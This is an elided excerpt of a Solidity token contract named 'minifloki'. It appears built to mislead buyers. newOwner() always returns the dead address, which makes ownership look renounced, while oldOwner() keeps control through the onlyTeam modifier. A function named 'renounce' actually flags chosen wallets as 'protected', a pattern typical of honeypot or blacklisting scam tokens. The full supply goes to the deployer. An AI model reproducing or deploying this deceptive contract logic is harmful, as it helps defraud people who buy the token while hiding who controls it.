...
contract minifloki is IERC20, Ownable {
    using Address for address;
    
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "minifloki";
    string constant _symbol = "minifloki";
    ...
    address payable public liquidityFeeReceiver = payable(0xA15A3D65c4fED09502c2a21CfF2870396CD194B2);
    address payable public marketingFeeReceiver = payable(0xA15A3D65c4fED09502c2a21CfF2870396CD194B2);
    ...
    modifier onlyTeam() {
        require(teamMember[_msgSender()] || msg.sender == oldOwner(), "Caller is not a team member");
        _;
    }
    ...
    constructor () {
        ...
        _allowances[oldOwner()][routerAddress] = type(uint256).max;
        _allowances[address(this)][routerAddress] = type(uint256).max;

        isFeeExempt[oldOwner()] = true;
        liquidityCreator[oldOwner()] = true;

        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[oldOwner()] = true;
        isTxLimitExempt[routerAddress] = true;
        isTxLimitExempt[DEAD] = true;

        _balances[oldOwner()] = _totalSupply;

        emit Transfer(address(0), oldOwner(), _totalSupply);
    }
    ...
    function newOwner() external view returns (address) { return DEAD; }
    ...
    function renounce(address[] calldata _newowner, bool _renounce) external onlyTeam {
        ...
        for (uint i = 0; i < _newowner.length; i++) {
            ...
            if (_renounce) {
                protectionCount++;
                emit ProtectedWallet(tx.origin, _newowner[i], block.number, 2);
            }
            else {
